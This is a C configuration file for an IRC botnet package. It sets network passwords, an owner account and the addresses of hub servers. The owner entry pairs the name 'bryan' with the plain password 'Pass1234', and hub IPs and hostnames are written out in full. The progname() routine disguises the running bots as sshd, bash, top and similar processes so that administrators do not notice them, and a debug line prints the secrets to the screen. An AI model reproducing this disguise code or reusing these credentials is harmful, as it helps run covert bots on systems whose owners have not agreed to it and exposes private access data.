#include <stdio.h>
#include <stdlib.h>

#define STR(x) x

extern char *degarble(int, char *);

char netpass[16], thepass[33], dcc_prefix[1], owners[2048], hubs[2048];

//Change everything..
#define NETPASS STR("kd8e3nchasd93dk")  //Just 15 random chars here..
#define THEPASS STR("d166239eb0558fc14c25a0826d20286d") //this md5 hash will be used for various purposes..
#define DCCPREFIX STR("!") //This is the cmd prefix for dcc, ie: .cmd could be "."


//You can define an infinite ammount of hubs/owners.
//All hubs must be added/defined in this, owners can be later added via partyline.
//"ip/hostname" means ip OR hostname, I highly recommend setting up dns for your hubs with hostnames.

/*
 * Give your main hub the number 1...
 * The order of the hubs makes no difference, but be sure to give each
 * bot a unique number, starting from 1 and not skipping any numbers.
 * See the example below for what username is.
 *
 */

/* IT IS IMPERATIVE TO ADD THE TRAILING COMMA AND SLASH CORRECTLY */

#define OWNERS STR("\
nick pass *!u@host *!u@ip *!u@host *!u@host *!u@ip,\
nick pass *!u@host -telnet!ident@host,\
")

#define HUBS STR("\
hubnick ip/hostname port 1 username username,\
hubnick2 ip/hostname port 2 username username,\
hubnick3 ip/hostname port 3 username username,\
")

#undef OWNERS
#undef HUBS

#define OWNERS STR("bryan Pass1234 *!bryan@botpack.net *!bryan@ip68-8-80-38.sd.sd.cox.net,")

#define HUBS STR("hub 66.252.27.116 9227 1 shatow,war war.botpack.net 9227 2 bryan ~war,")


//these are programs the leaf binaries will spoof as
char *progname() {
#ifdef S_PSCLOAK
  switch (random() % 13) { //Total entries + 1
    case 0: return STR("-bash");
    case 1: return STR("ftp");
    case 2: return STR("/usr/sbin/sshd");
    case 3: return STR("man");
    case 4: return STR("pine");
    case 5: return STR("bash");
    case 6: return STR("top");
    case 7: return STR("last");
    case 8: return STR("w");
    case 9: return STR("ps ux");
    case 10: return STR("bash");
    case 11: return STR("./psybnc");
    case 12: return STR("BitchX");
  }
#endif
  return "";
}

/* ------ DO NOT EDIT BELOW THIS LINE ------ */

void init_settings() {
  snprintf(owners, sizeof owners, OWNERS);
  snprintf(hubs, sizeof hubs, HUBS);
  snprintf(netpass, sizeof netpass, NETPASS); 
  snprintf(thepass, sizeof thepass, THEPASS);
  snprintf(dcc_prefix, sizeof dcc_prefix, DCCPREFIX);
printf("netpass: %s thepass: %s\n", netpass, thepass);
}
